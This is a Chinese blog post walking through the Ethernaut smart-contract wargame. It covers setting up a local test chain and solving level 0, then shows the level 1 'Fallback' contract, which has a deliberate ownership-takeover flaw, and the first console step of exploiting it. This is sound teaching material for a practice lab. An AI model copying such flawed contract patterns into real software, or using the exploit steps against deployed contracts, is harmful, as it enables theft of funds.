<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>区块链学习笔记：Ethernaut刷题记录 | Tover's Blog</title><meta name="keywords" content="writeup,BlockChain"><meta name="author" content="Tover. L"><meta name="copyright" content="Tover. L"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="如题，持续更新中...">
<meta property="og:type" content="article">
<meta property="og:title" content="区块链学习笔记：Ethernaut刷题记录">
<meta property="og:url" content="https://tover.xyz/p/Ethernaut-note/index.html">
<meta property="og:site_name" content="Tover&#39;s Blog">
<meta property="og:description" content="如题，持续更新中...">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://tover.xyz/img/icon.jpg">
<meta property="article:published_time" content="2023-09-18T09:33:30.000Z">
<meta property="article:modified_time" content="2024-01-25T03:33:19.850Z">
<meta property="article:author" content="Tover. L">
<meta property="article:tag" content="writeup">
<meta property="article:tag" content="BlockChain">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://tover.xyz/img/icon.jpg"><link rel="shortcut icon" href="/img/icon.jpg"><link rel="canonical" href="https://tover.xyz/p/Ethernaut-note/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://npm.elemecdn.com/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":400},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    jQuery: 'https://npm.elemecdn.com/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://npm.elemecdn.com/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://npm.elemecdn.com/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://npm.elemecdn.com/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://npm.elemecdn.com/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '区块链学习笔记：Ethernaut刷题记录',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-01-25 11:33:19'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const fontSizeVal = saveToLocal.get('global-font-size')
    if (fontSizeVal !== undefined) {
      document.documentElement.style.setProperty('--global-font-size', fontSizeVal + 'px')
    }
    
    const detectApple = () => {
      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Tover's Blog" type="application/atom+xml">
</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">73</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">14</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/icon.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Tover's Blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">区块链学习笔记：Ethernaut刷题记录</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-09-18T09:33:30.000Z" title="发表于 2023-09-18 17:33:30">2023-09-18</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-01-25T03:33:19.850Z" title="更新于 2024-01-25 11:33:19">2024-01-25</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">12.3k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>52分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="区块链学习笔记：Ethernaut刷题记录"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/p/Ethernaut-note/#post-comment"><span class="gitalk-comment-count"></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>如题，想练练区块链的题目，网上找了一圈发现题目大多都不在Running，后来<a target="_blank" rel="noopener" href="https://sh1k4ku.github.io/">@sh1k4ku</a>推荐了<a target="_blank" rel="noopener" href="https://ethernaut.openzeppelin.com/">Ethernaut</a>，于是，开刷。</p>
<p>Ethernaut的题目都比较简单，适合入门食用。</p>
<p>篇幅上我打算把全部题目写成一篇，想看对应题目的话直接点TOC跳转即可，当然推荐一直往下读（</p>
<h1 id="介绍篇">介绍篇<a class="anchor" href="#介绍篇">·</a></h1>
<p>首先介绍一下区块链/以太坊的一些概念，下面一些内容参考了<a target="_blank" rel="noopener" href="https://jayxv.github.io/">@Van1sh</a>的<a target="_blank" rel="noopener" href="https://jayxv.github.io/2021/12/22/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%88%9D%E6%8E%A2%E4%BB%A5%E5%A4%AA%E5%9D%8A/">初探以太坊</a>。</p>
<p>常见的区块链题目都会给出三个链接：RPC（Remote Procedure Call）、Faucet（水龙头/水管）和题目链接</p>
<ul>
<li>
<p>RPC：可以大概理解为链的提供者，我们需要链接上一个RPC后才可以在上面进行创建账户、部署合约、调用合约等操作。</p>
</li>
<li>
<p>Faucet：可以理解为免费的提款机（水龙头就是源源不断有水流出的意思），通常把自己钱包的公钥输进去后就会给你打钱，以太坊中的很多操作都需要付Gas（燃料费，可以理解为手续费），所以创建账户后首先要记得去水龙头拿钱。</p>
<p>但要注意如果用的是公共测试链的话需要一定拿钱门槛，而且给的还贼少，主链的话就不可能免费了，通常要用USD去换。</p>
</li>
<li>
<p>题目链接：用来部署题目、提交答案等，通常题目代码在这拿。</p>
</li>
</ul>
<p>不过在Ethernaut上会有点不一样，一会细说，先把概念记住就好。</p>
<p>除了上面三个链接，我们还需要一个钱包（或者说一个账户），常用的是<a target="_blank" rel="noopener" href="https://metamask.io/">MetaMask（小狐狸）</a>，按照指引装上他的浏览器插件即可，装完后在上面创建一个新的账户，然后就可以进Ethernaut了。</p>
<h2 id="Ethernaut介绍">Ethernaut介绍<a class="anchor" href="#Ethernaut介绍">·</a></h2>
<p>访问：https://ethernaut.openzeppelin.com/</p>
<p>如果你是第一次访问的话他会叫你设置网络（这个网络指的是RPC，不是互联网），如果你在配置过MetaMask中配置好网络的话点击“deploy”（部署）即可，如果看不懂的话暂时选它推荐的Sepolia即可，反正一会可以改的。（这里我没截到图，反正大概意思-）</p>
<p>PS：Sepolia是以太坊的一个公共测试链。</p>
<p>进去后点击右上角的设置，可以先把语言改了，然后如果刚才的网络没选好的话也可以在这里更改（不过好像只能选公共测试链）</p>
<img src="/p/Ethernaut-note/image-20230918180527198.png" class="" title="img_image-20230918180527198">
<p>另外网络也可以在MetaMask里改，点击MetaMask插件左上角选择网络，打开测试网络然后选择你想要用的网络即可，这里就可以选私链</p>
<img src="/p/Ethernaut-note/image-20230919095759509.png" class="" title="img_image-20230919095759509">
<p>最后稍微对应一下上面的三个概念，</p>
<p>首先RPC就是这里的网络，由于Ethernaut和MetaMask把连接的过程抽象成按钮点击，所以并不需要知道RPC的地址（链接），实在想知道的话可以在<a target="_blank" rel="noopener" href="https://www.alchemy.com/chain-connect">Alchemy</a>上查，比如Sepolia的话可以在<a target="_blank" rel="noopener" href="https://www.alchemy.com/chain-connect/endpoints/rpc-sepolia-sepolia">这里</a>查到：</p>
<ul>
<li>
<p>PRC URL：<code>https://rpc.sepolia.org</code></p>
</li>
<li>
<p>Chain ID：<code>11155111</code></p>
</li>
<li>
<p>Block Explorer：<code>https://sepolia.etherscan.io</code>，可以在这里查看该链上的区块（Block）信息</p>
</li>
</ul>
<p>PS：如果你想脱离Ethernaut平台自己写脚本的话，以上信息是必须知道的。</p>
<p>然后是Faucet，如果用的是公共测试链，就需要自己去找Faucet，还是拿Sepolia做例子，可以在<a target="_blank" rel="noopener" href="https://faucetlink.to/sepolia">这里</a>找到一些比较多人用的水管，但我自己试了一下除了<a target="_blank" rel="noopener" href="https://testnet-faucet.com/sepolia/">testnet-faucet</a>（每小时可以拿0.001测试币），其他不是代理问题就是需要主链有0.001ETH（PS：主链起充200+RMB）</p>
<p>之前也试过<a target="_blank" rel="noopener" href="https://access.rockx.com/faucet-sepolia">RockX</a>，但用了一段时间后也说需要主链有币才能用，emmm，所以公链的水管就需要自己想办法了</p>
<p>如果是私链的话，都是自己搭的链，改个数字就好了吧（x），比如<a target="_blank" rel="noopener" href="https://github.com/OpenZeppelin/ethernaut">自己本地搭Ethernaut</a>的话会提供几个初始账户，里面各有10000 ETH。</p>
<p>最后题目链接就是刚才的平台。</p>
<h1 id="搭建私链-Ethernaut平台">搭建私链/Ethernaut平台<a class="anchor" href="#搭建私链-Ethernaut平台">·</a></h1>
<p>如刚才说的，公链测试币太难拿了，所以不如自己搭个私链，<s>还不用怕在公链上乱搞被骂</s>。</p>
<p>在这其实有几个选择，你可以</p>
<ul>
<li>按<a target="_blank" rel="noopener" href="https://github.com/OpenZeppelin/ethernaut">Ethernaut的GitHub</a>上的指引搭建一个完整的本地平台，这个一会细说</li>
<li>也可以按Ethernaut的指引搭建好私链并部署好协议后，访问在线的Ethernaut平台，你可以认为Ethernaut平台只是一个前端，因为部署Ethernaut的时候会有各种坑，如果平台实在没建起来的话可以凑合用着在线的（不过链是自己的）</li>
<li>当然也可用<a target="_blank" rel="noopener" href="https://geth.ethereum.org/">Geth</a>、<a target="_blank" rel="noopener" href="https://hardhat.org/">Hardhat</a>等搭建自己的私链，MetaMask连上链后，访问Ethernaut，但是还要自己把题目部署上链，有点麻烦</li>
</ul>
<p>下面马克一下我部署Ethernaut的过程</p>
<p>首先把项目克隆下来</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone git@github.com:OpenZeppelin/ethernaut.git</span><br><span class="line">cd ethernaut</span><br></pre></td></tr></table></figure>
<p>然后你需要安装<a target="_blank" rel="noopener" href="https://nodejs.org/">NodeJS</a>，这里建议装16.x的版本，因为旧了会报错，新了也会报错。。。</p>
<p>比较推荐使用<a target="_blank" rel="noopener" href="https://github.com/nvm-sh/nvm">NVM</a>（我Windows的话是<a target="_blank" rel="noopener" href="https://github.com/coreybutler/nvm-windows">NVM for Windows</a>），Releases里下载安装后</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nvm install 16</span><br><span class="line">nvm use 16</span><br></pre></td></tr></table></figure>
<p>即可，如无意外执行<code>nvm list</code>会显示（版本可能不一样）</p>
<img src="/p/Ethernaut-note/image-20230919103916136.png" class="" title="img_image-20230919103916136">
<p>如果执行多次都没显示<code>(Currently using 64-bit executable)</code>的话，可能需要删除安装时填的那个<code>nodejs</code>，再执行<code>nvm use 16</code>，参考：<a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/47017812/nvm-use-does-not-switch-node-versions">这里</a></p>
<p>然后需要装<code>yarn</code>（<code>-g</code>是全局的意思，如果不想全局的话。。。自己解决吧-）</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install yarn -g</span><br></pre></td></tr></table></figure>
<p>然后就可以跟着GitHub上的指引安装，首先安装依赖</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yarn install</span><br></pre></td></tr></table></figure>
<p>开启私链（基于Hardhat，但不用自己另外装，上面已经装了）</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yarn network</span><br></pre></td></tr></table></figure>
<p>执行完后会打印出20个测试账户，里面各有10000 ETH，一会刷题可以使用这些账户，就不用折腾水管了</p>
<p>另外，这个窗口不能关闭，否则链就关了，所以下面命令需要另外开一个窗口</p>
<p>接着编译题目</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yarn compile:contracts</span><br></pre></td></tr></table></figure>
<p>打开<code>client/src/constants.js</code>，把<code>ACTIVE_NETWORK</code>设置为<code>NETWORKS.LOCAL</code>（有一行注释的，删掉注释即可）</p>
<p>另外<code>client/src/constants.js</code>行17的<code>url: &quot;http://localhost&quot;</code>改为<code>url: &quot;http://127.0.0.1&quot;</code>，不然一会部署题目可能会报<code>CONNECTION ERROR</code>，参考：<a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/68513645/error-connecting-to-localhost-after-npm-hardhat-run">这里</a></p>
<p>部署题目</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yarn deploy:contracts</span><br></pre></td></tr></table></figure>
<p>如无意外的话到这里私链就搭好了，如果不想继续弄下去的话可以在MetaMask中选择<code>Localhost 8545</code>的私链后访问在线的Ethernaut平台</p>
<p>接下来开启本地平台</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yarn start:ethernaut</span><br></pre></td></tr></table></figure>
<p>PS：当时我用18.x的NodeJS报<code>0308010C:digital envelope routines::unsupported</code>，降级为16.x后就没问题，参考：<a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/69692842/error-message-error0308010cdigital-envelope-routinesunsupported">这里</a></p>
<p>如无意外的话会弹到<code>http://localhost:3000/</code>，上面有一个和在线版一模一样的Ethernaut平台</p>
<p>接着打开MetaMask，网络选择<code>Localhost 8545</code>，然后导入账户，在刚才<code>yarn network</code>的列表中选一个私钥导入，到这里如果看到自己的1w ETH就算配置成功了</p>
<img src="/p/Ethernaut-note/image-20230919110551212.png" class="" title="img_image-20230919110551212">
<p>下面开始<s>愉快地</s>刷题</p>
<p>PS：如果把<code>network</code>关闭再重启后，MetaMask上可能会出现<code>nonce</code>不对的情况，这时在MetaMask中：<code>设置 -&gt; 高级 -&gt; 清楚活动选项卡数据</code>清一下<code>nonce</code>即可，不过注意之前的交易记录会被清调，谨慎操作</p>
<h1 id="00-Hello-Ethernaut">00_Hello Ethernaut<a class="anchor" href="#00-Hello-Ethernaut">·</a></h1>
<p>点击开始进入第0关</p>
<p>上面有一些平台的指引，MetaMask刚才已经配置好了，接下来打开控制台：<code>Ctrl + Shift + i</code>或<code>F12</code>，然后转到<code>Console</code>，输<code>help()</code>可获得所有指令，可以都试试</p>
<p>点“生成新实例”开始游戏，会弹出MetaMask要求交手续费，点确认即可，然后</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">await contract.info()</span><br><span class="line">// &#x27;You will find what you need in info1().&#x27;</span><br><span class="line"></span><br><span class="line">await contract.info1()</span><br><span class="line">// &#x27;Try info2(), but with &quot;hello&quot; as a parameter.&#x27;</span><br><span class="line"></span><br><span class="line">await contract.info2(&#x27;hello&#x27;)</span><br><span class="line">// &#x27;The property infoNum holds the number of the next info method to call.&#x27;</span><br><span class="line"></span><br><span class="line">(await contract.infoNum()).words[0]</span><br><span class="line">// 42</span><br><span class="line"></span><br><span class="line">await contract.info42()</span><br><span class="line">// &#x27;theMethodName is the name of the next method.&#x27;</span><br><span class="line"></span><br><span class="line">await contract.theMethodName()</span><br><span class="line">// &#x27;The method name is method7123949.&#x27;</span><br><span class="line"></span><br><span class="line">await contract.method7123949()</span><br><span class="line">// &#x27;If you know the password, submit it to authenticate().&#x27;</span><br><span class="line"></span><br><span class="line">await contract.password()</span><br><span class="line">// &#x27;ethernaut0&#x27;</span><br><span class="line"></span><br><span class="line">await contract.authenticate(&#x27;ethernaut0&#x27;)</span><br></pre></td></tr></table></figure>
<p>执行<code>contract.authenticate('ethernaut0')</code>，需要交手续费，最后提交实例，也要手续费</p>
<p>PS：关于手续费，如果一个操作需要写入，则需要手续费，如果是只读则不用（好像需要运算的也要？</p>
<p>通过后可以获得本关的题目代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Instance &#123;</span><br><span class="line"></span><br><span class="line">  string public password;</span><br><span class="line">  uint8 public infoNum = 42;</span><br><span class="line">  string public theMethodName = &#x27;The method name is method7123949.&#x27;;</span><br><span class="line">  bool private cleared = false;</span><br><span class="line"></span><br><span class="line">  // constructor</span><br><span class="line">  constructor(string memory _password) &#123;</span><br><span class="line">    password = _password;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function info() public pure returns (string memory) &#123;</span><br><span class="line">    return &#x27;You will find what you need in info1().&#x27;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function info1() public pure returns (string memory) &#123;</span><br><span class="line">    return &#x27;Try info2(), but with &quot;hello&quot; as a parameter.&#x27;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function info2(string memory param) public pure returns (string memory) &#123;</span><br><span class="line">    if(keccak256(abi.encodePacked(param)) == keccak256(abi.encodePacked(&#x27;hello&#x27;))) &#123;</span><br><span class="line">      return &#x27;The property infoNum holds the number of the next info method to call.&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    return &#x27;Wrong parameter.&#x27;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function info42() public pure returns (string memory) &#123;</span><br><span class="line">    return &#x27;theMethodName is the name of the next method.&#x27;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function method7123949() public pure returns (string memory) &#123;</span><br><span class="line">    return &#x27;If you know the password, submit it to authenticate().&#x27;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function authenticate(string memory passkey) public &#123;</span><br><span class="line">    if(keccak256(abi.encodePacked(passkey)) == keccak256(abi.encodePacked(password))) &#123;</span><br><span class="line">      cleared = true;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function getCleared() public view returns (bool) &#123;</span><br><span class="line">    return cleared;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="01-Fallback">01_Fallback<a class="anchor" href="#01-Fallback">·</a></h1>
<p>仔细看下面的合约代码.</p>
<p>通过这关你需要</p>
<ol>
<li>获得这个合约的所有权</li>
<li>把他的余额减到0</li>
</ol>
<p>这可能有帮助</p>
<ul>
<li>如何通过与ABI互动发送ether</li>
<li>如何在ABI之外发送ether</li>
<li>转换 wei/ether 单位 (参见 <code>help()</code> 命令)</li>
<li>Fallback 方法</li>
</ul>
<p>题目代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Fallback &#123;</span><br><span class="line"></span><br><span class="line">  mapping(address =&gt; uint) public contributions;</span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  constructor() &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">    contributions[msg.sender] = 1000 * (1 ether);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier onlyOwner &#123;</span><br><span class="line">        require(</span><br><span class="line">            msg.sender == owner,</span><br><span class="line">            &quot;caller is not the owner&quot;</span><br><span class="line">        );</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  function contribute() public payable &#123;</span><br><span class="line">    require(msg.value &lt; 0.001 ether);</span><br><span class="line">    contributions[msg.sender] += msg.value;</span><br><span class="line">    if(contributions[msg.sender] &gt; contributions[owner]) &#123;</span><br><span class="line">      owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function getContribution() public view returns (uint) &#123;</span><br><span class="line">    return contributions[msg.sender];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function withdraw() public onlyOwner &#123;</span><br><span class="line">    payable(owner).transfer(address(this).balance);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  receive() external payable &#123;</span><br><span class="line">    require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其实只要执行<code>receive</code>就可以获得所有权，但还要绕过里面的<code>require</code></p>
<p>首先check一下<code>owner</code>，显然不是我</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">owner = <span class="keyword">await</span> contract.owner()</span><br><span class="line"><span class="comment">// &#x27;0x0165878A594ca255338adfa4d48449f69242Eb8F&#x27;</span></span><br></pre></td></tr></table></figure>
<p>然后贡献点钱，绕过<code>receive</code>里的<code>contributions[msg.sender] &gt; 0</code>，这里钱好像不能转太少，不然还是当作<code>0</code>，不懂solidity的小数机制（留坑），捐钱可以调用合约的<code>contribute</code>函数，捐多少钱可以通过输入<code>value</code>控制，其中<code>toWei</code>是把单位<code>ETH</code>转换为单位<code>Wei</code>，<code>toWei('0.0001')</code>就是我要转<code>0.0001 ETH</code>的意思，只是这里<code>value</code>接受的单位是<code>Wei</code>，所以要转</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.contribute(&#123;<span class="attr">value</span>: toWei(<span class="string">&#x27;0.0001&#x27;</span>)&#125;)</span><br></pre></td></tr></table></figure>
<p>检查一下有没捐成功，刚才说了，因为会有一个小数的坑</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">await</span> contract.getContribution()).words</span><br><span class="line"><span class="comment">// (3) [8011776, 1490116, empty]</span></span><br></pre></td></tr></table></figure>
<p>不是空的，就是成功了</p>
